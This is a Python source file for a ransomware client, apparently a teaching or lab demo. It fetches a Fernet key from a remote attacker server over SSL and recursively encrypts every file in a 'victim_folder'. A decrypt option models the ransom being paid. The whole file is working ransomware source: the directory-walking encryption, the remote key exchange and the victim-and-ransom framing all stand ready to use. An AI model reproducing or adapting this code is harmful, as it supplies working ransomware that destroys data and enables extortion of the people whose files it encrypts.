import socket
import ssl
import constants
from cryptography.fernet import Fernet
import os

class ClientRans:
    def __init__(self, ip: str) -> None:
        self.ip = ip

    def create_client(self) -> ssl.SSLSocket:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_ssl = ssl.wrap_socket(client)
        return client_ssl

    def get_key(self, client: ssl.SSLSocket) -> Fernet:
        client.send(constants.ATTACK_CHOICE.encode('utf-8'))
        key = client.recv(constants.BUFFER_SIZE)
        f = Fernet(key)
        return f

    def encrypt_file(self, fernet_object: Fernet, file_name: str) -> bool:
        with open(file_name, "rb") as file:
            file_data = file.read()

        encrypted_file = fernet_object.encrypt(file_data)

        with open(file_name, "wb") as file:
            file.write(encrypted_file)

        return True

    def decrypt_file(self, fernet_object: Fernet, file_name: str) -> bool:
        with open(file_name, "rb") as file:
            file_data = file.read()

        decrypted_file = fernet_object.decrypt(file_data)

        with open(file_name, "wb") as file:
            file.write(decrypted_file)

        return True

    def iterate_folder(self, folder_name: str, function, fernet_object) -> bool:
        directory = os.listdir(folder_name)
        for item in directory:
            full_path = os.path.join(folder_name, item)
            if os.path.isfile(full_path):
                function(fernet_object, full_path)
            elif os.path.isdir(full_path):
                self.iterate_folder(full_path, function, fernet_object)

        return True

if __name__ == "__main__":
    client_obj = ClientRans(socket.gethostbyname(socket.gethostname()))
    client = client_obj.create_client()
    client.connect((constants.SERVER_IP, constants.SERVER_PORT))
    choice = 1
    key = None

    while choice in [1, 2]:
        print("The choices:")
        print("1 - doing the attack")
        print("2 - decrypt the files in the folder")

        choice = int(input("Enter choice (1/2): "))

        if choice == 1:
            key = client_obj.get_key(client)
            client_obj.iterate_folder("victim_folder", client_obj.encrypt_file, key)
            print("The victim folder was encrypted!")
        elif choice == 2:
            if key:
                client_obj.iterate_folder("victim_folder", client_obj.decrypt_file, key)
                print("The victim paid for the key...")
            else:
                print("Key not available. Perform attack first.")
        else:
            print("Server ends ...")
            client.send(constants.END_CHOICE_NORM.encode('utf-8'))

    client.close()